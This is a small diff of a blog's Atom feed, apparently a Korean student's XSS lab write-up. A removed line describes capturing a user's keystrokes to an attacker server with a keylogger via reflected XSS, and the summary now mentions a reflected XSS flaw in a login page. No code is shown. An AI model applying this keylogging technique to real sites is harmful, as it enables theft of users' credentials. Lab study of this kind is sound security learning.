-  <li>키로거를 사용하여 공격자 서버로 직접 사용자의 입력을 받아보았다. url을 주의깊게 보지않는이상 사용자는 이상있는지 확인하기 어렵다는 것을 알 수 있었다. 키로거를 이용한 새로운 공격이라 흥미로웠다.</li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><summary type="html"><![CDATA[XSS 실습 7번 문제를 풀어보자.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="XSS" /><category term="Reflected XSS" /><category term="java" /><summary type="html"><![CDATA[로그인 페이지 Reflected XSS 취약점 발견하였다.]]></summary></entry></feed>
